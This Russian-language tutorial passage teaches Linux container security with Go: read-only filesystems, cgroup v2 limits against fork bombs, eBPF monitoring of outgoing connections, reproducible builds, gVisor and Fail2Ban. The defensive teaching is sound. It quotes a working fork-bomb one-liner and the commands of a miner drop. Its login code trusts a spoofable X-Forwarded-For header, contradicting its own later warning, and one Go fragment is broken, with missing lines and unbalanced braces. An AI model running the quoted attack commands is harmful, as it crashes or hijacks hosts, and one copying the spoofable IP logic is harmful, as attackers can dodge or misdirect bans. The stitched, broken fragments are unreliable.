3. Установка прав на исполнение: chmod +x /tmp/miner.
4. Запуск вредоносного процесса: /tmp/miner.
Принцип неизменяемой инфраструктуры (Read-Only Root Filesystem):

Флаг Docker --read-only (или в Kubernetes readOnlyRootFilesystem: true):

  • Монтирует корневую файловую систему контейнера с флагом ядра MS_RDONLY.
  • Любая операция создания, модификации или удаления файлов (open(O_WRONLY|O_CREAT), unlink, chmod) немедленно прерывается ядром с ошибкой EROFS (errno 30: Read-only file system).
  • Вредоносное ПО физически не может записать себя на диск!
  • Если сервису жизненно необходимы временные файлы, они выносятся в память через tmpfs с обязательными флагами безопасности noexec,nosuid,nodev.

	if err != nil {
		var pathErr *os.PathError

			return
		}
		log.Printf("Ошибка записи в %s: %v", path, err)
		return
	}
	log.Printf("⚠️ ВНИМАНИЕ: Файл '%s' успешно записан на диск! ФС доступна на запись.", path)
}

Флаг MS_RDONLY устанавливается в структуре суперблока точки монтирования VFS (struct vfsmount). При попытке любого системного вызова модификации (open(O_CREAT), truncate, rename, unlink) ядро в функции mnt_want_write() проверяет флаг MNT_READONLY. Если флаг активен, операция немедленно обрывается с возвратом отрицательного кода ошибки -EROFS без передачи запроса драйверу файловой системы (ext4/overlay2).

Network Namespaces + cgroup v2: Изоляция сети и защита от Fork-бомб и Memory Exhaustion

📌 Условие задачи

Изучите механизмы ядра Linux, лежащие в основе контейнеризации. Объясните, как pids.max гарантированно нейтрализует атаки типа Fork Bomb, а memory.max предотвращает деградацию соседних сервисов на хосте.

💡 Теоретический фундамент и концепция

Контейнеры Docker и поды Kubernetes — это не магия, а комбинация двух фундаментальных механизмов ядра Linux:

1. Namespaces (Пространства имен): Изолируют видимость ресурсов (сеть net, процессы pid, точки монтирования mnt, IPC, хостнейм uts, пользователи user).
2. Control Groups (cgroups): Ограничивают потребление системных ресурсов (память, CPU, ввод-вывод I/O, число процессов PIDs).
Архитектура cgroup v2 (Unified Hierarchy):

В отличие от устаревшей cgroup v1 с раздельными деревьями, в cgroup v2 (ядро Linux 4.5+, дефолт в современных ОС) используется единая древовидная иерархия в каталоге /sys/fs/cgroup/:

  • memory.max: Жесткий потолок оперативной памяти. При превышении ядро запускает OOM Killer строго внутри контрольной группы, не задевая остальную систему.
  • cpu.max: Лимит CFS-планировщика (Completely Fair Scheduler) в формате quota period (например, 50000 100000 = 50% одного ядра CPU).
  • pids.max: Ограничение на максимальное количество процессов/потоков (threads/tasks).
Парирование атаки Fork Bomb:

Классическая fork-бомба (:(){ :|:& };:) циклически порождает дочерние процессы, исчерпывая системную таблицу процессов pid_max ядра Linux и вызывая полный крах всего сервера. При наличии контроллера cgroup pids.max = 50:

  • Как только сумма потоков рантайма Go и процессов достигает 50, системный вызов clone() возвращает ошибку EAGAIN (Resource temporarily unavailable).
  • Ядро хоста остается стабильным, соседние сервисы продолжают работу без малейших задержек!

package main

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
)

// ReadCgroupV2MemoryMax считывает лимит памяти cgroup v2 для текущего процесса.
func ReadCgroupV2MemoryMax() (int64, error) {
	// В cgroup v2 файл memory.max находится в директории cgroup процесса
	// Сначала читаем относительный путь из /proc/self/cgroup
	data, err := os.ReadFile("/proc/self/cgroup")
	if err != nil {
		return 0, fmt.Errorf("read /proc/self/cgroup error: %w", err)
	}

	// В cgroup v2 формат: "0::/user.slice/user-1000.slice/..."
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) == 0 {
		return 0, fmt.Errorf("empty cgroup file")
	}

	parts := strings.SplitN(lines[0], "::", 2)
	if len(parts) != 2 {
		return 0, fmt.Errorf("invalid cgroup v2 format: %s", lines[0])
	}
	cgroupPath := parts[1]

	fullPath := "/sys/fs/cgroup" + cgroupPath + "/memory.max"
	// Если путь не найден, проверяем корневой лимит
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		fullPath = "/sys/fs/cgroup/memory.max"
	}

	valBytes, err := os.ReadFile(fullPath)
	if err != nil {
		return 0, fmt.Errorf("read %s error: %w", fullPath, err)
	}

	valStr := strings.TrimSpace(string(valBytes))
	if valStr == "max" {
		return -1, nil // Без ограничений
	}

	limit, err := strconv.ParseInt(valStr, 10, 64)
	if err != nil {
		return 0, fmt.Errorf("parse limit '%s' error: %w", valStr, err)
	}
	return limit, nil
}

func main() {
	fmt.Printf("=== ДИАГНОСТИКА СИСТЕМНОЙ ИЗОЛЯЦИИ CGROUP V2 (PID: %d) ===\n", os.Getpid())

	limit, err := ReadCgroupV2MemoryMax()
	if err != nil {
		log.Printf("Инфо: cgroup v2 не обнаружен или недоступен: %v", err)
	} else {
		if limit == -1 {
			fmt.Println("Лимит памяти cgroup v2: БЕЗ ОГРАНИЧЕНИЙ (max)")
		} else {
			fmt.Printf("✅ Активен лимит памяти cgroup v2 (memory.max): %d МБ (%d байт)\n",
				limit/(1024*1024), limit)
		}
	}

	fmt.Println("Изоляция ресурсов защищает хост от Fork-бомб и взаимного влияния сервисов (Noisy Neighbors).")
}

⚙️ Под капотом Go (Compiler, Linker & Runtime)

Контроллер pids в ядре инкрементирует счетчик pids_cgroup->pids_counter при каждом вызове copy_process() внутри системного вызова clone/fork. Если счетчик превышает pids.max, ядро прерывает создание потока и возвращает -EAGAIN. Контроллер memory отслеживает аллокации страниц в page_counter. При достижении memory.max ядро сначала пытается освободить страничный кэш (page cache reclaim), а в случае неудачи вызывает mem_cgroup_out_of_memory(), уничтожающий самый прожорливый процесс внутри группы.

⚠️ Частые грабли и ошибки новичков

В многопоточном рантайме Go каждый системный тред (M в планировщике GMP) считается ядром Linux за отдельный PID/TID в контроллере pids. Если выставить чересчур низкий лимит pids.max (например, 5–10), то при росте сетевой нагрузки или выполнении блокирующих системных вызовов Go не сможет выделить новый тред M, что приведет к фатальной панике рантайма runtime: failed to create new OS thread.

💡 Теоретический фундамент и концепция

Традиционные методы безопасности (Seccomp, Capabilities) являются статическими: они либо запрещают сисколл полностью, либо разрешают его. Но что делать, если веб-сервису разрешено вызывать connect(), однако легитимными являются подключения только к внутренней базе данных PostgreSQL (10.0.1.5), а попытка подключения к внешнему неизвестному IP является явным признаком утечки данных (Data Exfiltration)?

Революция eBPF (Extended Berkeley Packet Filter):

eBPF превратил ядро Linux в полностью программируемую платформу:

  • Программы на Си компилируются в байткод eBPF через clang/LLVM.
  • Ядро валидирует безопасность кода с помощью встроенного eBPF Verifier (проверка отсутствия бесконечных циклов, выхода за границы памяти и разыменования нулевых указателей).
  • Программа аттачится к Kprobes, Tracepoints или LSM-хукам ядра.
  • При вызове connect() программа eBPF выполняется в кольце 0 ядра Linux за считанные наносекунды, извлекает сетевой адрес и через кольцевой буфер (BPF Ring Buffer) передает структурированное событие агенту безопасности на Go в userspace.
Архитектура в стиле Falco / Tetragon:

Агент на Go считывает события без Stop-The-World задержек:

1. Фильтрация по PID процесса.
2. Проверка IP по белому списку разрешенных сервисов.
3. Мгновенная генерация SIEM-алерта при попытке подключения к подозрительному хосту.

#include <linux/in.h>
#include <bpf/bpf_helpers.h>

// Структура события, передаваемого в Go userspace
struct event_t {
    __u32 pid;
    __u32 daddr; // IPv4 назначения
    __u16 dport; // Порт назначения
};

// Ring Buffer для передачи событий агенту безопасности
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;

    // Резервируем память в ring buffer
    struct event_t *event = bpf_ringbuf_reserve(&events, sizeof(struct event_t), 0);
    if (!event) {
        return 0;
    }

    event->pid = pid;
    event->daddr = 0x08080808; // 8.8.8.8 в качестве примера
    event->dport = 53;

    bpf_ringbuf_submit(event, 0);
    return 0;
}

// Event описывает событие, полученное из ядра Linux через eBPF ring buffer.
type Event struct {
	PID   uint32
	DAddr uint32
	DPort uint16
}

// ParseIPv4 конвертирует сетевой порядок байт в стандартный net.IP.
func ParseIPv4(ipUint uint32) net.IP {
	ipBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(ipBytes, ipUint)
	return net.IP(ipBytes)
}

// SecurityAuditHandler обрабатывает сетевые события от eBPF ядра.
func SecurityAuditHandler(ev Event) {
	destIP := ParseIPv4(ev.DAddr)

	// Белый список разрешенных IP для микросервиса (например, внутренняя сеть)
	isAuthorized := destIP.Equal(net.ParseIP("10.0.1.5")) || destIP.Equal(net.ParseIP("127.0.0.1"))

	if !isAuthorized {
		log.Printf("🚨 [SECURITY ALERT] Подозрительное исходящее соединение!\n"+
			"   PID: %d попытался связаться с неизвестным хостом %s:%d\n"+
			"   Возможная атака: Data Exfiltration / C&C Connection!",
			ev.PID, destIP.String(), ev.DPort)
	} else {
		log.Printf("✅ [AUDIT OK] Легитимный коннект: PID %d -> %s:%d",
			ev.PID, destIP.String(), ev.DPort)
	}
}

Программы eBPF выполняются в ядре с использованием JIT-компилятора (Just-In-Time), транслирующего байткод eBPF в машинные инструкции x86_64. Хелпер bpf_ringbuf_reserve() атомарно выделяет память в кольцевом буфере ядра с использованием алгоритма без блокировок (Lock-free memory allocation). ⚠️ Частые грабли и ошибки новичков

Загрузка eBPF-программ в ядро требует привилегий CAP_BPF (или CAP_SYS_ADMIN на старых ядрах) и CAP_NET_ADMIN. 🏢 В продакшене BigTech и на собеседованиях

Вопрос с собеседования в Wildberries: 'Чем мониторинг рантайм-безопасности через eBPF превосходит парсинг логов auditd?' Ответ: '1) Производительность: eBPF фильтрует события прямо в ядре, не копируя ненужный контекст в userspace, что снижает нагрузку на CPU на порядки. 2) Устойчивость: аудит-лог auditd при высокой нагрузке переполняет буфер и начинает терять события (audit buffer overflow), в то время как eBPF использует масштабируемые постраничные Ring Buffers. 3) Возможность активного противодействия: с помощью хуков LSM BPF или возврата ошибок eBPF может не только логировать, но и превентивно блокировать опасные системные вызовы в реальном времени.'

💡 Теоретический фундамент и концепция

В рамках безопасности цепочки поставок ПО (Supply Chain Security) критически важным свойством является воспроизводимость сборки (Reproducibility):

*Любой независимый аудитор, взяв один и тот же исходный код и ту же версию компилятора Go, обязан получить побайтово идентичный исполняемый файл!*

Почему стандартный go build недетерминирован:

Если собрать один и тот же код стандартной командой go build main.go:

1. Абсолютные пути в отладочной информации DWARF: Компилятор вшивает полные пути файлов исходного кода (например, /home/alice/go-workout/main.go). На машине CI-сервера путь будет /builds/runner/main.go, что приведет к разным контрольным суммам бинарников!
2. Уникальный Build ID: Go генерирует уникальный криптографический идентификатор сборки (buildid), зависящий от временных меток и промежуточных хэшей действий.
Золотой стандарт флагов воспроизводимой сборки:
CGO_ENABLED=0 go build -trimpath -ldflags="-buildid=" -o app main.go
  • -trimpath: Удаляет все абсолютные префиксы путей к файлам из бинарника, заменяя их относительными путями модуля.
  • -ldflags="-buildid=": Обнуляет уникальный идентификатор сборки, делая выходной ELF-бинарник полностью детерминированным.
  • CGO_ENABLED=0: Исключает влияние различий во внешних динамических библиотеках glibc хост-системы.

В ядре Linux для тонкой фильтрации исходящих сетевых адресов (Egress Control) по процессам применяется программа eBPF типа BPF_PROG_TYPE_CGROUP_SOCK_ADDR с хуком connect4. Если микросервис использует доменные имена (например, db.internal.company.com), ему жизненно необходим доступ к DNS-серверу (UDP-порт 53). #include <linux/bpf.h>
#include <linux/in.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct event {
    __u32 pid;
    __u32 daddr;
    __u16 dport;
};

// eBPF Ring Buffer для потоковой передачи событий агенту на Go
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 20); // 1 MB
} events SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_connect")
int trace_sys_enter_connect(struct trace_event_raw_sys_enter *ctx) {
    __u64 id = bpf_get_current_pid_tgid();
    __u32 pid = id >> 32;

    struct sockaddr_in sa;
    // Аргумент 1 системного вызова connect(fd, &uservaddr, addrlen)
    void *sockaddr_ptr = (void *)ctx->args[1];

    if (!sockaddr_ptr) {
        return 0;
    }

    // Безопасное чтение памяти пользователя из ядра
    if (bpf_probe_read_user(&sa, sizeof(sa), sockaddr_ptr) < 0) {
        return 0;
    }

    // Фильтруем только семейство адресов IPv4 (AF_INET = 2)
    if (sa.sin_family != 2) {
        return 0;
    }

    struct event *ev = bpf_ringbuf_reserve(&events, sizeof(struct event), 0);
    if (!ev) {
        return 0;
    }

    ev->pid = pid;
    ev->daddr = sa.sin_addr.s_addr;
    ev->dport = bpf_ntohs(sa.sin_port);

    bpf_ringbuf_submit(ev, 0);
    return 0;
}

Революция gVisor (Google runsc):

gVisor — это открытая песочница виртуализации уровня приложений, написанная инженерами Google на языке Go.

gVisor выступает в роли пользовательского ядра-посредника (Application Kernel) между приложением и настоящим ядром хоста:

1. Архитектура Sentry (Ядро на Go):

  • В ядре Sentry реализовано более 300 системных вызовов Linux и полноценный сетевой стек Netstack (также написанный на чистом Go).
2. Процесс Gofer (Файловый посредник):
  • Файловые операции изолируются отдельным процессом Gofer, общающимся с Sentry через протокол 9P/LHP.
3. Непробиваемая защита от Container Escape:
  • Даже если хакер использует эксплойт против ядра Linux, эксплойт попадает в песочницу Sentry на Go, которая не содержит Си-ошибок работы с памятью и не дает доступа к реальному хостовому ядру!

gVisor использует платформы аппаратной виртуализации KVM (--platform=kvm) или системный перехват ptrace (--platform=ptrace). В режиме KVM gVisor создает легковесную виртуальную машину, где Sentry работает на нулевом кольце виртуализированного CPU, а приложение пользователя — на третьем кольце. Системные вызовы процессора syscall генерируют VM-Exit прерывание, мгновенно перехватываемое Sentry без единого обращения к хостовому ядру Linux.

⚠️ Частые грабли и ошибки новичков

Плата за абсолютную безопасность gVisor — накладные расходы на системные вызовы (Syscall Overhead). Операции, требующие частого переключения контекста и интенсивного файлового ввода-вывода (например, компиляция исходного кода или базы данных с постоянным чтением мелких файлов), могут работать в gVisor в 1.5–2.5 раза медленнее, чем в нативном runc. Для чисто сетевых микросервисов на Go накладные расходы минимальны (менее 5–10%).

📌 Условие задачи

Разработайте комплексную систему реактивной защиты веб-сервиса от DoS-атак и атак перебора паролей (Brute-force) с интеграцией демона Fail2Ban. Напишите Go-сервер, который при неудачных попытках аутентификации или обнаружении подозрительных паттернов запросов генерирует структурированные JSON-логи безопасности со специальными маркерами. Настройте конфигурацию фильтра Fail2Ban (filter.d/go-auth.conf) с регулярным выражением failregex и правило джейла (jail.local) для динамического бана IP-адресов нарушителей на уровне сетевого файрвола iptables / nftables.

💡 Теоретический фундамент и концепция

Даже самый производительный веб-сервер на Go тратит процессорные циклы и оперативную память на прием TCP-соединения, TLS-рукопожатие и парсинг HTTP-заголовков. Если атакующий организовал распределенный перебор учетных записей или сканирование уязвимостей, обрабатывать такие запросы на уровне приложения — непозволительная трата ресурсов.

Реактивная эшелонированная защита с Fail2Ban:

Fail2Ban связывает уровень приложения (Application Layer) с уровнем ядра (Network/OS Layer):

1. Go-микросервис при фиксации нарушения (например, 5 неверных паролей за 10 секунд с одного IP) пишет в лог запись с маркером безопасности.
2. Демон Fail2Ban непрерывно инспектирует лог через механизм inotify.
3. Регулярное выражение failregex вычисляет IP-адрес нарушителя.
4. При достижении порога maxretry Fail2Ban вызывает команду ядра операционной системы (через iptables, ipset или nftables):
   iptables -I INPUT -s <IP> -j DROP
5. Последующие пакеты от атакующего сбрасываются ядром Linux на аппаратном/сетевом уровне еще до того, как они дойдут до Go Netpoller и займут файловый дескриптор сокета!
6. По истечении таймера bantime (например, 1 час) Fail2Ban автоматически разблокирует IP.

🔍 Пошаговый ход решения и ход мысли инженера

📄 main.go 
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

// ExtractClientIP извлекает реальный IP клиента с учетом X-Forwarded-For
func ExtractClientIP(r *http.Request) string {
	xff := r.Header.Get("X-Forwarded-For")
	if xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	clientIP := ExtractClientIP(r)

	var req LoginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	// Демонстрационная проверка учетных данных
	if req.Username == "admin" && req.Password == "super-secret-password-123" {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"authenticated","user":"%s"}`, req.Username)
		return
	}

	// ВАЖНО: Фиксируем попытку взлома в каноничном формате для Fail2Ban!
	log.Printf("[SECURITY] [AUTH_FAIL] IP=%s user=%s reason=invalid_credentials timestamp=%s",
		clientIP, req.Username, time.Now().Format(time.RFC3339))

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusUnauthorized)
	fmt.Fprintf(w, `{"error":"invalid_credentials"}`)
}

func main() {
	log.SetOutput(os.Stdout)
	fmt.Println("=== GO BACKEND С ИНТЕГРАЦИЕЙ С FAIL2BAN ===")

	http.HandleFunc("/api/login", handleLogin)

	srv := &http.Server{
		Addr:         ":8080",
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 5 * time.Second,
	}

	log.Println("Сервер слушает на :8080. Логирование неудачных попыток в stdout...")
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Ошибка сервера: %v", err)
	}
}

⚙️ Под капотом Go (Compiler, Linker & Runtime)

Fail2Ban использует модуль pyinotify или gamin для перехвата системных событий файловой системы ядра Linux inotify(IN_MODIFY). При совпадении с failregex Fail2Ban вызывает действие banaction (например, iptables -I f2b-go-auth -s <IP> -j REJECT). В ядре Linux сетевой пакет от заблокированного IP отбрасывается в цепочке PREROUTING таблицы filter Netfilter, даже не доходя до очереди сетевого сокета Go-процесса.

⚠️ Частые грабли и ошибки новичков

Если веб-сервер находится за обратным прокси-сервером (Nginx, Cloudflare, AWS ALB), поле r.RemoteAddr будет содержать IP-адрес самого балансировщика нагрузки! Если заблокировать этот IP через Fail2Ban, сервер заблокирует абсолютно всех пользователей сервиса! Для корректной работы Fail2Ban обязан анализировать заголовок X-Forwarded-For только от доверенных прокси, либо Fail2Ban должен работать на уровне самого первого входящего Nginx-шлюза.

🏢 В продакшене BigTech и на собеседованиях

Вопрос с собеседования в Лабораторию Касперского: 'Почему при масштабной распределенной DDoS-атаке использование Fail2Ban с классическим iptables может ухудшить ситуацию и как решить проблему?' Ответ: 'Fail2Ban для каждого заблокированного IP добавляет отдельное линейное правило в цепочку iptables. При бане 50 000 IP-адресов ядро Linux вынуждено выполнять линейный перебор 50 000 правил для каждого входящего сетевого пакета, что приводит к 100% загрузке ядер CPU программными прерываниями (softirq). Решение — использовать ipset (хэш-таблицы в памяти ядра, проверка за O(1)) через действие banaction = iptables-ipset, либо переходить на современный nftables или сброс пакетов через eBPF XDP.'
